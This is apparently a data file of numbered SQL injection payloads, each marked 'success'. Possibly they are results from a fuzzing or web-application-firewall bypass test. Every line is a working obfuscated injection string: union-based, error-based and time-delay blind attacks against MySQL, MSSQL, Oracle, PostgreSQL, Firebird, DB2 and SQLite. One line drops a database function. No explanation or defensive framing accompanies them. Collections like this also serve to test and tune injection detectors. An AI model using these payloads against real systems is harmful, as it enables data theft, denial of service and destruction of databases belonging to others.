436 success "0x1'   )    )    As jntr WheRe 5051  =  5051 anD   (  SelEct 9067 fRom  (  seLEct count  (  *  )  ,concat  (  0x7171706a71,  (  SelecT   (  elt  (  9067  =  9067,0x1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )\t   )   x froM information_schema.character_sets group by x  )  a  )  -- "
438 success "1'/**/ )\n  As chla WHeRe 6098   like   (sELeCT 6098) "
440 success 'SElEct count  (  *  )   fROm domain.domains As t1,domain.columns As t2,domain.tables aS t3/*yr*/anD\t   (    (  \x0c"vqpx" LiKe "vqpx '
442 success 'SeLECT   (  CASe WhEn   (  9986  =  8342\x0b )   Then 9986 elsE 9986*  (  seLECT 9986/**/frOm information_schema.character_sets  )   ENd  )  # '
444 success "0x1'  ) /*Qvp}P*//**/AND 'i'<>'iH' "
446 success "-1621' In boolean mode  ) \n order by (sELECt 1)-- cz"
449 success '-0x21e1"  )   or make_set/**/ (  0x21a9!=(SELECT 8618) AND True,0x1c11  )   and   (  "edap" like/*o^LO\n*/"edap '
450 success 'SElECT sleep  (  0x5  )   anD    (    (     (  "%"   lIkE /*`7\nB*/ " '
451 success "-7868'\tiN boolean mode  )   union all sElECT 5117,5117,(SELECT 5117),5117,5117,5117,5117,5117,5117# "
452 success '/**/select\nsleep  (  5  )   and "%"  =  " '
453 success "-4205'\nunion all SELecT 8986,8986,8986,8986,8986,8986,8986,8986,8986,8986# "
455 success 'seLect   (\x0b CAse WhEn   (  7254  =  5901  )   ThEN 1 eLSe (selEct 7254)*  (  SeLect 7254 frOm/*g-*/master..sysdatabases  )   end  )  -- '
457 success '(SELecT 0x1)"  )   as ebvt WHeRE 5305   lIkE   5305 '
458 success "(SELECT 0x1)%'/**/ )  /**/union\nall selECt null# 7`"
459 success '-0x268f"  )   union all selECt 0x237a# #\rWI'
460 success "-(SELECT 6368)' union all SELeCT\t6529,6529,6529-- v="
461 success '0x1   )    )    AND (SELECT 0x2426)   LIKE     (  select count \n(  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- '
463 success '(SELect/**/(SELECT 1))"   ) \x0b  )    as nncz WheRe 2331   like   0x91b '
464 success '0x1" and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  0x1ffe  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    '
465 success "0x1'+  (  select/**/fhbk where 'f] '='f]\x0c' and (SELECT/*}P*/0x15b4)  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +' "
467 success '1" wheRe 0x963   LIKE   2403 AND (SELECT 7681)=7681/**/aNd 1 OR \'(\' NOT LIKE \'(\' Or 4915  =    (  SELEcT count  (  *  )   FRoM domain.domains AS t1,domain.columns aS t2,domain.tables/*S3*/as t3  )  -- '
470 success 'SeLEct CaSe whEN 7951 \n=  1147 THen 1 eLse null END-- g'
471 success '(SELECT (SELECT (SELECT 1)))%"   ) /**/ \t)\x0b   union all select/**/null,null,null,null,null,null,null,null# z_'
472 success '(Select (sElEct (sEleCt (sEleCT 1))))"   )    )    As rrms WheRe \'j\'<>\'jT\' union all/**/sElect null,null,null,null,null,null,null,null-- '
473 success '-8203   )    )    As eqlf WHere 6132   like   6132 oR 0 AND True anD True union\xa0all SeleCt 6132,6132,6132,6132,6132,(sElect 6132),6132,6132,6132-- '
474 success '0x1" WHere 0x1b67  =  (SELECT 7015) OR False procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  SEleCt   (  CASe WHen   (  5840   LIKE /**/ 5840  )   tHen 0x1\teLsE 0 END   )    )   ,0x717a767a71   )    )   ,1  )  -- /kF'
477 success "-7371' /**/)   union all sElecT 4531,4531,0x11b3# "
478 success '-(SELECT 4191)  )   order by 1#/*\nI#>*/'
479 success '0x1"  )  \nAS nyzd WHere 0x14b9   lIke   5305 '
481 success ' SeleCT * frOM users WHeRE id  /**/Like   (sElECT\x0b1) Or ".]" OR/**/\'jx_\'!=\'jx_k\'\x0b-- 1 l,'
482 success 'seLECT count  (  *  )   frOM domain.domains as t1,domain.columns AS t2,domain.tables/**/as t3 AND   \x0b(    (     (  "%"   liKe   "/*qSG*/'
483 success "0x1'  /**/)    )    and (SELECT 6510)  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'vcvj'  =  'vcvj "
484 success "-0x25c8' /**/ )    )    as rupb where\n8218  =  8218 OR False OR 'p'='p{' Or make_set  (  4954   LIkE   1836,1836/**/ )  -- "
485 success '-6546"  ) /**/ order\x0cby 0x1# sA'
486 success "-4480'  )   whERE 4661  =  4661 AND True or 1570  =  convert  (  int,  (  SeLECT char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  selecT   (  CAse wHEN   (  1570  =  1570  )   Then char  (  49  )   ElsE char  (  48  )   END   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- "
489 success '0x1" \n )    )    AS ltco WHEre 3862   LIKE   3862 Or 5286  =    (  SelEcT count  (  *  )   FroM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- '
490 success ' seLect * fRoM users whErE id  =  1 Or/*>I`<*/"{." || 3132=3132 AnD 1 -- 1 '
491 success '(SeLEct (SELECT 1))  )   aNd (SELEct 6510)  =    (  sELeCT count  (  *  )   fROm sysusers AS sys1,sysusers As sys2,sysusers as sys3,sysusers As sys4,sysusers AS\x0bsys5,sysusers AS sys6,sysusers aS sys7  )   '
493 success "(seLecT (SELECT 0x1))'||  ( /**/select 'bzxa' WhEre 0x18b0   like  \x0b(SELECT 6320) "
494 success '0x1"\tWHEre/**/0x1bc6  =/**//**/7110 '
495 success "-3088' or 6872 \x0b=  6872/**/OR '('<>'(' and 'miwk'  =/**/ 'miwk "
496 success "-1591 whEre '/' Like '/' union all SeLeCt 3291,(sELECT 3291),3291,3291,3291,3291,3291,3291,3291# "
497 success '1 WhERe 7158  =  7158 oR False OR elt  (  5873  =  5873,sleep  (  5  /**/)    )   # '
498 success 'sElECt * frOm users WhERE id  =  1 +  ( \xa01  )   oR 1  =  1 -- 1 9[\tD'
499 success "OR 'something'    like    'some'+'thing' "
501 success "0x1   )    )    as shmg where 1371   LIKE   1371 OR 'e'!='e' union all\x0cselect null,null,null,null,null,null,null,null,null,null# "
502 success '-0x1bc7%" union all select/**/6083,6083,6083,6083,6083,6083-- '
506 success 'SElect * frOM generate_series /**/(  1488,1488,CaSE whEN   (  (SELECT 1488)  =  1685  )   tHEn 1 ElSE 0 end  )   limit 1-- -5'
507 success 'SElecT   (  caSE When/*K\t*/  (  4043   LikE   5276  )   ThEn 4043 eLSE 0xfcb*  (  SeLect 4043 fRoM information_schema.character_sets  )   end  )  # '
509 success '1 union/**/all sELEct null,null,null,null,null,null,null,null,null#/*~*/EA'
511 success "(SELECt 0x1)' In boolean mode  )\n  or/**/2367  =    (  SELECT count  (  *  )   frOm rdb$fields aS/**/t1,rdb$types AS t2,rdb$collations As t3,rdb$functions AS t4  )  -- 3N"
514 success "1'+/**/ (  SeleCT hett WHErE 7228  =  7228 Or 7945=7946 "
515 success "0x1'/**/  ) /**/ /**/)    or sleep  (  5  )   and \n  (    (   'uzhd' like 'uzhd "
516 success "waitfor delay/**/'0:0:5'/**/AND '%' \x0b LIKe   ' "
518 success 'sELeCt   (  Case wHEn   (  9299   liKe   0xac8  )\xa0  tHen (SELECT 0x1) ElSE 9299*  (  sElecT (sElecT (SELECT 9299)) fRoM master..sysdatabases \x0b)   End  )  -- 2k'
519 success '(sElECT 0x1)  )   Or sleep\x0c (  5/*c*/ )  # V5'
520 success "-9098'||  ( /**/select 'xodn' from dual where\n2244 IN (2243,2244,2245) union all select 8202,8202,8202,8202,8202,8202,8202-- "
522 success "(SELECT (SELECT 0x1))'   )    )     )   and 0xe7b  =    (  select count  (/**/ *  ) \x0b from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  'wsmq'  =  'wsmq "
524 success '-0x2035"   )    )     OR  0xbde/**/  Like   0xbde '
527 success " (  sELEcT * FroM   (\x0c sElecT  (  sleep  (  (seLeCT 0x5)   )    )     )  srmq  )   aND    (    (   'cbaj'   LIKE   'cbaj "
528 success '0x1%"   )\t/*R"hC?*/  )    union all SElEct null,null,null,null,null,null,null,null,null,null-- '
530 success '1 WheRe 9898  =  9898 AND 621 NOT LIKE 622 AND 1 aNd 4241  =  convert  (  int,  (  seLeCt char  (  113  )  +char  (  113  ) /**/+char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  SelECT   (  CASE WHEN   (  4241  =  4241  )   theN char  (  49  )   ELSe char  (  48  )   End   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- '
533 success "0x1'+  (  select 'mtpt' wHErE 7483   lIKE   0x1d3b anD True && True union all seLEct null,null,null,null,null,null,null,null,null-- "
534 success "-6906' WHErE 1839   LIke   1839 union all sEleCT 1839,1839,1839,1839,1839-- "
535 success "0x1'|| /*+\n+E*/(  select 'kptj' FRoM dual WherE 5123   LikE   5123 oR 0x0 "
537 success 'SeLEct \x0c (  CASE WhEN   (  7645   LIkE   5921  )   theN 7645 else 7645*  (  SELEct (SELeCT 7645) FrOM information_schema.character_sets  )   enD  )  #/*[[Pl*/'
540 success '0x1/*<0e9*/uni/**/on\x0cselect all from where '
542 success "(sEleCT 0x1)'+  (/**/ select 'epza' where 0x2322  =/*Wm&T*/ (SELECT 8994) and make_set  (  (SELECT 3782)  =  2428,2428   )    )   +' "
544 success "0x1'+  (  select 'opqr' whERE 2442  =  2442 oR 1022 /*NTwbX*/ like     (  SElEct count  (  *  )   FRoM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- "
547 success ' sELect * FROm users WhEre id   LIKE   1 union SELeCt @ 1a,version /**/(    )  /*KQu-i*/-- (SELECT 1) '
550 success '0x1%" or exp  (  ~ /**/(  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  7123=7123,(SELECT 1)   )    )     )  ,0x717a767a71,0x78   )    )  \tx   )    )    and "%" /**/=  " '
554 success "seLECT count  (  *  )   FroM domain.domains/**/AS t1,domain.columns aS t2,domain.tables AS t3 AnD    ( /**/  (   'wusq'  =  'wusq "
558 success "0x1' /**/)/*\x0c*/\n order by (sELEcT/**/1)# "
561 success ' sEleCt * fROm users WHErE id   lIkE   1 Or  @$#  =  1 union select 0x1,version  (    )   -- 0x1 7'
563 success "-(SELECT 2820)' \n )    )    or 6679  = \n0x2290-- "
566 success '(SELECT 0x1)" WheRe 0x240e  =\n 9230 '
569 success '/**/select * from users where id  =  1 or\n@#"  (    =  0x1 or \'=m4\' LIKE \'=m4\' -- 1 5k\x0c?'
570 success 'seLeCt   (  CASe wHeN   (  3539  =  0x2240  )   TheN 3539 elSE cast  (  1 AS int  )  /  (  seLEct 0 FRom dual  )   end\n )   FROm dual-- A'
571 success '-3666" /**/ )    )  /**/  )   union all seLecT (SeLECt 0x1028),0x1028,(SelECT 4136)--\n'
574 success "-4775' /**/)   OR 8325 IN (8324,8325,8326) OR\x0c0 "
576 success '(SeLEcT (SELECT 0x1))"  )   and /**/ (  select * from   (  select  (  sleep  (/**/ 0x5   )    )     )  fzno  )   and   (  "ppml"  =  "ppml '
577 success "1'\nwhere 0x65c   LIKE  /**/0x65c "
578 success '-4015" wHere \'\t]_\'<>\'\t]_8\' or 1 group by concat  (  0x7171706a71,  (  SelecT   (  CAsE whEn   (  4232  =  4232 aND 0x23d7 LIke 9175  )   thEn 1 eLSe 0 enD   )  /**/ )  /**/,0x717a767a71,floor  (/**/ rand\x0c (  0x0  )  *2   )    )    having miN  (  0  )  # oG'
579 success "1'+  (  select/**/'rpds' where 5870  =  5870 and '9m' LIKE '9m'# "
582 success '0x1"   )    )    as/**/hace\x0cWhere\x0c8818 LiKe 8818 AND 1 AND 1  Or  0x0 '
583 success "-(SELECT 9145)'  )   As xyya WhEre 489 LIKE 489 AND 1 union/**/all sELect/**/8950,8950,8950,8950,0x22f6,8950,8950,8950-- "
585 success "0x1%' /**/)   union all sELECt null,null,null,null,null--\x0c"
589 success '-3250%"/**/union all SelECt 7162,7162,7162,7162,7162,7162,7162,7162,7162-- '
591 success '-8777"  )   aS lalf wHERE 5471\tLikE 5471 aND 1292 NOT LIKE 1293 AnD/**/True Or elt  (  4397  =  (SELEcT 5823),5823  )  -- '
592 success "-4406%' union\x0ball select 0x257f,9599,9599,9599#\t"
593 success "(SEleCt 0x1)   )   /**/)    And   (  SElecT 9067 frOm  (/**/ sElEcT count  (  *  )  ,concat  (  0x7171706a71,  (  SeLECT   (  elt  (  9699 NOT LIKE 9700 AnD 1619 lIKe 1619 AND 3277 IN (3276,3277,0xcce) Or False or 0x0,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )  \x0cx froM\x0binformation_schema.character_sets group by x  )  a  )   AND    (    (   '$<' likE '$<' "
594 success "-(SELECT 6567)'   )   /**/) \xa0  union all select (SElEct 3217)# \\"
599 success "-6370'   )    )  \x0b AS sims whERE 9456 NOT LIKE 9457 && 1 Or 5649 LIke 5650 union all SeLECT 9388,(SeLECT 9388),9388,9388,9388,0x24ac,0x24ac,9388# x\t"
600 success "seleCt count  (  *  )   FrOM generate_series  (  1,5000000  )   ANd    (    (     (  'xori' liKe 'xori "
603 success '1 wheRE 8921   LIKE   8921 || 0 rlike   (  selECT * FROM   (  selEct  ( /**/sleep  (  5   )    )     )  sgvo  )  -- '
610 success "(sELeCt 0x1)%'\xa0 )   union all seLECT\nnull,null-- t"
611 success "-(SELECT 1459)'   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'eiet' like 'eiet "
612 success 'SELecT dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  ( \x0c79  )  ||chr  (  101  )  ,5  )   FrOm dual &&   (  "layz"  =  "layz '
614 success '0x1 rlike   (  sELEct */**/FrOm   (  SeLEct  (  sleep  (  5   )    )     )  sgvo  )  # ewsz '
616 success '0x1 union all select null,null,null,null,null,null# '
617 success "-3166'||  (  select 'mtan' fRom\tdual wHeRE 4834 IN (4833,4834,4835) union all selEcT 9420# "
618 success "-4055'   )    )    AS yoez wherE 3816   likE   3816 AND 1 Or   (  8459   like   8459 AND 1  )  *(seleCt 4906)-- "
619 success "(SEleCt 0x1)'   )    )    aS icik WhERE (select 1440)  =  0x5a0 and 8189  =    (  sElEct count  (  *  )   FROm sysibm.systables AS t1,sysibm.systables As t2,sysibm.systables As t3  )  -- "
620 success ' SeLEct * FroM users WHeRe id  =  \'0x1\' union selEcT +\\.,@@VERSION -- 0x1\' "'
622 success "OR ':\\L'<>':\\Lq' /* "
626 success "(SELEct 0x1)%' /**/\n)    )    or   (  seLECT * fRoM   (  SeLecT  (\x0b sleep  (  0x5   )    )     )  sddo  )  # "
627 success '0x1" and 0x2142  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and "ouix"  =  "ouix '
628 success ' OR 6152=6152/**/or ""  =   '
629 success 'SElect   (  caSe When   (  4297   lIKe   9086  )   then 4297 ElSE 0x1/  (  seleCT 0  )   enD  )  -- '
631 success '0x1 and sleep  ( \x0c(SELECT 5)  ) /**/'
634 success '1" Where 8029 IN (8028,8029,8030) AND 7630 LIKE 7630 or 0 Or \'n-\'!=\'n-\' OR   ( \tSElect * fROM   (  sELect  (  sleep  (  5/* (4!{*/  )    )     )  ydpu  )  -- '
636 success "0x1'||  ( \x0cselect 'lzzr' wHeRE 9980=9980 OR 4596=4597 AND True "
637 success "0x1' in boolean mode/*3*/ )\t  waitfor delay/**/'0:0x0:(SELECT 5)'-- "
639 success "0x1'+  (  select mrdi where 7451  =/**/ 7451 and 8594  =    (  select 8594 from pg_sleep /**/(  0x5   )    )   -- "
640 success "(SELECT/**/1)%'   )  \xa0 )     )   union all select null,null,null,null,null,null,null,null,null,null-- V"
641 success '-5520"   )    )    as utqk WHeRe 7762  =  7762 AND 9920 LIKE 9920 aND 1 Or \'/L \'=\'/L )\' Or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr\t (  113  )  ||chr  (  (SelECT 113)  )  ||chr  (  (SELECT 112)  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seLect   (  CASe wHEN   (  \';s\'!=\';sP\'  )   tHEn 1 ELSE 0 End  )   FROM dual  )  ||chr  (  (sELecT 113)  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- ]M'
645 success ' sElEct * FroM users Where id  =  1 or ".@" Or 1  = /**/1 -- 1 '
648 success "0x1'/**/  )/**/   )    rlike sleep  (\t 0x5  )  # "
649 success '-0x1edd/**/ )\t  order by 0x1-- '
650 success "0x1  )   As rnfb wHeRe '8gu' LIKE '8gu' OR 0 AND '0x7'<>'(SELECT 73)' or 8514  =  benchmark  (  0x4c4b40,md5  (  0x544d5a4c /**/ )    )   # f2L"
651 success '(SeleCt (seLEct 1))  )   WhEre 1270   lIKe   1270 OR 8448<>8448 oR 1415 NOT IN (1414,1415,1416) Or   (  sEleCT 0x23d5 frOm  (  SeLECT count  (  *  )  ,concat  (  0x7171706a71,  (  seLeCt   (  elt  (  9173  =  (seLeCt 9173),1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x frOm information_schema.character_sets group by x  )  a  )  -- y/'
654 success '(sELect/**/1)" WHeRe (SElECt 8107)=(SELeCt 8107)/*u8*/'
655 success "select LIKE /*cj*/(  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    "
657 success '0x1 AND elt\x0b (  (SELECT 4249)\t = /*ne\\*/4249,7259  )\xa0  '
658 success "1'/**/where 3700   like\xa0  3700 union all select null,null,null-- |"
660 success "(SELECT 0x1)' In boolean mode  )   OR   (  sElECT * frOm   (  selecT  (  sleep  (  5   )    )   /**/ )  ydpu  )  # }<"
661 success "(sELeCT 1)'+  (  SeleCT ukwc WHerE 0xbc0  =  0xbc0\tor   (  SeLECT * frOM   (  SeLect  (  sleep  (  (SELECT 5)  /**/)    )     )  sddo  )  # "
663 success "-2630'   )    )    AS xavw WHeRe 5438 In (5437,5438,5439) union all SeLECt 6291,6291,6291,6291,6291,6291,6291,6291,6291# Q"
670 success "-1272' OR 1 group by concat  (  0x7171706a71,  (  seLECT   (  CAsE WhEN   (  4232  =  4232  )   THEn 1 eLse 0 End   )    )   ,0x717a767a71,floor  (  rand  ( \n0  )  *2   )    )   /**/having MiN  (  0  )  # "
672 success '-(SelECt 4091)"   )    )\t/**/ /**/ )   union/* */all SeLect 6694,6694-- '
673 success 'SeLECT   (  cAse WHEn   (  7033   LIke   1594  )   tHeN 7033 ELSe 7033*  (  seleCT 7033 frOM information_schema.character_sets  )   enD  )  # '
674 success '0x1"  )   as semi wherE 7883 not like 7884 '
675 success '(SELECT 0x1)"/**/  ) \x0b  )     ) /**/ waitfor delay \'(SELECT 0):0:0x5\' and/**/   (    (     (  "tuhy" like/*<W*/"tuhy '
676 success "0x1'  )   WheRe 0x16fb\t  like   5883 OR 4411  =    (  SeleCt count  (  *  )   FrOm sysusers/**/As sys1,sysusers As sys2,sysusers aS sys3,sysusers aS sys4,sysusers aS sys5,sysusers AS sys6,sysusers aS sys7  )  -- \rS"
679 success "SelEcT benchmark  (  5000000,md5  (  0x4c4d6142   )    )    aND    (    (     (  '%'   liKe   ' "
680 success "seLEcT dbms_pipe.receive_message  (  chr/**/ (/**/ 66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  (SELECT 101)  )  ,5  )   fRoM dual  )   Or\xa0' "
681 success "1'\x0b  ) /*q*/  )    and 2462!=2463 AND 'c' LIKE 'c' and    (    ( /**/\x0b'ialm'  =  'ialm "
683 success "0x1'  )   as mqxb where 4519 LIKE 4519 OR False and 7533  =  7533 OR 1739 NOT LIKE 1739-- "
685 success "0x1%'  )   and/**/  (  (SELECT 3020)  =  3020 AND True  )  *6703 and   (  '%'  =  ' "
686 success '1 Or 0x113b\n  LIKE     (  sELeCt count  (  *  )   fRom sysusers AS sys1,sysusers As sys2,sysusers As sys3,sysusers AS sys4,sysusers As sys5,sysusers aS sys6,sysusers As sys7  )  -- ctdx B@'
689 success ' Select * FroM users wherE id   likE  \x0c1.*1 union SeLecT 1,banner frOm v$version WHERe rownum  =  1 -- 1 3v'
691 success ' union   (  seLeCt NULL, NULL,/*H*/  (  sELECt @@version   )    )  \x0b -- '
693 success "waitfor delay\n'0:0x0:5'\tAND 'gsvt'   LIke   'gsvt "
694 success "-5008' union/**/all select/*ez*/1942,1942,1942,1942,1942,1942,1942,1942-- \x0b}"
695 success ' SelEcT * From users WHERe id  =  1\noR "._" or 6083 LIKe 6083 -- 0x1 '
696 success "0x1' aNd (selECT 0x2142)   LikE  /*u7=X*/  (  SELEct count  (  *  )   FroM domain.domains aS t1,domain.columns aS t2,domain.tables as t3  )   "
698 success '0x1"  \x0c)    )    aS/**/eglv wHERE 7412/*Xj(MM*/  LIKE   (SELECT 7412) union all/**/SElECt null# '
699 success '(SELECT 0x1)   )    )    as wwkw where 7289   like   7289 AND 1 && (SELECT 7533)   LIKE   7533-- '
700 success "(sELEcT 0x1)' or 2367   lIKE  \n  (  seleCT count  ( \x0c*  )   FrOM rdb$fields aS t1,rdb$types aS t2,rdb$collations AS t3,rdb$functions AS t4  )  -- =Z"
702 success '-9434" /**/)   as cqlw\x0cwhere 1600  =  (SELECT 1600) or/**/0xaad  =  1047-- '
703 success "(SELECT 0x1)%'/**/  )    )     ) /*ij\\q*/ union all sELect null,null,null,null# "
705 success 'seLect pg_sleep  (  (SELecT 5)  )   aNd    (    (   "qani"   like   "qani '
706 success "0x1'  )\x0b  As ohcs WhERE 9588   likE   0x2574 || elt  ( /**/'\t'<>'\tI',sleep  (  5   )    )   -- "
707 success '0x1  )   where 5261  =  5261 AND True and elt  (  0x4ba  =  1210,sleep  (  5   )    )   -- '
708 success '0x1"  )   where \'1nl\' NOT LIKE \'1nlr\'/**/'
709 success "-0x24d8   )  \n )    AS nqya whErE 'F'<>'F'' OR elt/*ba*/ (  9242/**/ =  6180,0x1824  )  -- QV"
711 success "(SeLEcT (SELECT 1))'/**/ )   || 0x93f   LikE     (  SElecT count  (  *  )   FRoM rdb$fields aS t1,rdb$types as t2,rdb$collations as t3,rdb$functions AS t4  )\x0b -- "
712 success "(SELEct 0x1)'  )   As syer wherE/**/'W' NOT/**/LIKE 'W3' ANd True rlike   (  SElEcT   (  cASE wheN   ( \t6233  =  7567/**/ )   thEn 0x1 ELse 0x28 eNd   )    )   -- "
713 success '-7971   )/**/   )    as armw where 9474  =  9474 OR make_set  (  9354  =  9354,7185  ) \xa0-- wY'
715 success '\x0bsELEct * FrOM\tusers WHere id   lIKe   1 OR/**/1#"? oR \'@\'<>\'@4\' --/**/1 '
720 success ' end AND    (    (   "dmgj"  =  "dmgj '
722 success "(SElECt 1)'+  (  seLeCt nash wHERE 4159   lIke   0x103f union all SeLeCT null# "
724 success '-4210"  )   WhEre 2679  =  2679 Or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  SElECT   (  CasE When   (  4493  =  4493  )   thEN 1 elSe 0 End  )/*\n*/  fRom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- '
726 success "(SELECT 1)'/**/where 8478!=8479 OR 'jH\\k'='jH\\kK' "
727 success 'sEleCt \x0c (  cASE/**/whEN/**/  (  5418  =  6516  )   tHEN 1/**/elSE 5418*  (  SelECT (selEct 5418) FRom master..sysdatabases  )   eND  )  -- '
731 success "(SEleCt/**/1)'||  (  select 'wadx' whErE 4287  =/**//**/4287 oR sleep  (  5  )  # "
732 success 'sELeCt count  (  *  )   frOM generate_series  (  1,5000000  )   aNd "ihbe" like "ihbe '
734 success '0x1"/**/or 2633  =  dbms_pipe.receive_message  (  chr  (  0x70  )  ||chr  (  65  )   OR chr  (  (SELECT 65)  )  ||chr  (  103  )  ,5  )   '
735 success '(SELECT (SELECT 0x1))%"   )    )     )   or (SELECT 9643)  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   /**\n\nh*/(    (     (  "%"  =  " '
736 success '0x1 OR char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  ( \n65  )  ||char  (  0x45  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  -- Ey'
738 success '0x1c% '
741 success '1 WhERE 5443   LikE   0x1543 '
743 success '-2817  )   whERe 1212  =  1212 OR 3266  =/**/ 1102 '
746 success 'seLEcT case whEN 0xe4d  =  9315 tHEn 0x1 else null enD-- -'
749 success "1  )   WHere 9344 \x0b LIke \x0b 9344 AND 4324 LIKE 4324 OR 0/*C1*/And '$QU{m' NOT LIKE '$QU{m7' "
752 success " sELeCt * frOM users WHerE id  = /**/'1' oR \\<$ union seLEct 1,@@VERSION -- 1' "
754 success "-2120'  )   oR 8734\x0c  LIKE   8844# "
761 success '(SELECT (SELECT 0x1))" wHERe \' \\\'<>\' \\R\' union all SElECt\x0bnull,null,null,null,null,null,null-- Lf!ey'
762 success ' seLECt * FrOm users WHEre id  =  (sELect 1) OR "  (  _" Or 1  =  1/**/-- 1 '
765 success "1'/**/ )   WherE 6385<>6386/**/"
769 success "0x1'+  (  select 'qrml' where 3791  = \x0c3791 OR 0 OR 0 OR 'E#l_'!='E#l_' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   ) \x0b  )      )    )     )  +' "
770 success '0x1" \x0c )   /*L}<Q{*/)/*-*/   union all sElECT null,null,null,null,null,null,null# '
774 success 'SElECt   (  CaSe whEN   (  3863 /**/ liKe   1151  )   TheN 3863 elsE cast  (  1 As int  )  /  (  seLect 0 fROm dual  )   END  )   From dual-- '
775 success "0x1' IN boolean mode  )   oR/**/sleep  (  5  )  # "
777 success "0x1  )   whEre 'hq90*' NOT LIKE 'hq90*Q' and 'G'!='G)' "
779 success "-6527'  /**/)    )\t   union all sELECt 0x13bd,5053,5053,5053-- f"
780 success 'If  (  1928  =  4811  )   SeleCt 1928 elSE droP function ucko-- '
781 success ' (  sEleCt   (  CASE wHEN   (  (SeLeCT 4108)   LIKe   4108 And 1  )  /*N7:.*/tHEN (SeLecT 1) ElSE (SeLeCT 4108)* \x0b(  selecT 4108 froM information_schema.character_sets  )   enD   )    )  '
782 success "waitfor/**/delay '0:0:5' And \t (  4614  =  4614 OR False or 'i' NOT LIKE 'i' "
783 success '-0x15c7"\nunion all sElECt/**/8665,8665,0x21d9,0x21d9,8665,8665,8665--/**/'
785 success '0x1,  (  SELECT   (  cAsE When   (  7616   LIKE   0x1dc0  )\n  THEn 1 eLSe 1/  (  selEct/**/0  )   ENd   )    )    '
786 success '(SELECT (SELECT 0x1))"   )    )    as ynuw where 9138  =  0x23b2 '
787 success "(seLEcT/**/1)' or 0xa49  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  0x41  )  ||chr  (  65  )  ||chr  (  103  )  ,5 \t)   and 'gkku' like 'gkku "
788 success 'seLECt * FroM users WHerE id   LIke   (seLecT 1) + $+%1 oR\t7257 liKE 7257 -- 0x1 b'
789 success 'iif  (  7011   LIKE  /**/2522,0x1,1/0x0\n )\x0c/**/ '
790 success '0x1 AND 6510  =    (  select count  (  * \x0b)   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  -- ixlk '
791 success '0x1"  )   WheRe 0x1a0f  =  0x1a0f Or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )     LIKE   regexp_substring  ( \x0crepeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null/**/ )  -- '
796 success ' seLEct * fRoM users\x0cwHERE id   lIKe   (SELect/**/1) oR ";[" or 1   lIke   0x1 AND \'3A\'!=\'3A;\' -- 0x1 '
798 success "-2223'   )    )    As mjwp whERe 8650  =  8650 OR 7900\x0b =  5838 "
802 success '1 wHERe 0x8fd/**/ = \x0b2301 '
804 success 'selECt LiKE  (  \'abcdefg\',upper  (  hex  (  randomblob  (  0x1dcd6500/(SELECT (sELEct 0x2))\n \x0c)    )      )    )    anD "ejmj" LiKe "ejmj '
806 success 'SelecT count  (  *  )   FrOm sysibm.systables aS t1,sysibm.systables/**/AS t2,sysibm.systables AS t3-- N4'
808 success "1/**/ )   && make_set\n (/**//*3s:*/'mtB'!='mtB?',8899  )   "
811 success '0x1"   )    ) \xa0  aS vhrq WheRe (SELecT 1690)   lIKe   (SELeCT 1690) And elt  (  \'mK\'=\'mK\' OR 0 and \'M\'!=\'MK\',sleep  (  5   )\x0b  /**/)   --\t'
812 success '(SELECT 0x1)%" or   ( /**/select * from   (  select  (  sleep  (  (SELECT 5)   )    )     )  ydpu  )   and "%"  =  " '
813 success "0x1'||  ( /**/select/**/'xbwg'/**/wheRE 7518  \tlIKe   7518 OR 'W' NOT LIKE 'W' union all SeLeCt null,null,null,null,null,null-- _ "
816 success "0x1' and 0xc82  =  like  (  'abcdefg',upper  (  hex  (/**/ randomblob  (  500000000/2   )    )      ) /**/  )    and 'imqi'  =  'imqi "
